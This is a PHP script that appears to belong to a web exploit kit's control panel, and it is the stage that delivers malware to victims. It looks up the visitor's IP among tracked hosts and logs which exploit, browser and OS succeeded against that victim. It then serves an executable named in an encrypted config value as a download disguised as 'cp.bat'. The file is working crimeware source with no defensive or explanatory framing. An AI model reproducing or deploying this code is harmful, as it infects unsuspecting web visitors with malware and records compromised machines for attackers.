<?php


ob_start(  );
require_once( 'config.inc.php' );
require_once( 'CP-ENC-7531.php' );
$ip = $cpFunctions->GetIP(  );
$cpMySQL->ConnectMySQL(  );
$count = mysql_query( 'SELECT * FROM `' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . 'peeps` WHERE ip = \'' . $ip . '\' AND sploit = \'\'' );

if (mysql_num_rows( $count ) < 1) {
	$cpFunctions->Error404Dupe(  );
}


if (( ( !isset( $_GET['o'] ) || !isset( $_GET['b'] ) ) || !isset( $_GET['spl'] ) )) {
	$cpFunctions->Error404Dupe(  );
}

$spl = $cpMySQL->antisqli( $_GET['spl'] );
$b = $cpMySQL->antisqli( $_GET['b'] );
$o = $cpMySQL->antisqli( $_GET['o'] );

if (isset( $_GET['i'] )) {
	$i = $cpMySQL->antisqli( $_GET['i'] );
}
else {
	$i = 'unk';
}

$cpMySQL->AddExploitedIp( $spl, $b, $o, $i );
$exename = $cpMySQL->DataDecrypt( LOADEXE );
$content = file_get_contents( $exename );
$fsize = strlen( $content );
header( 'Accept-Ranges: bytes
' );
header( 'Content-Length: ' . $fsize . '
' );
header( 'Content-Disposition: attachment; filename=cp.bat
' );
header( 'Content-Type: application/octet-stream

' );
echo $content;
ob_end_flush(  );
?>
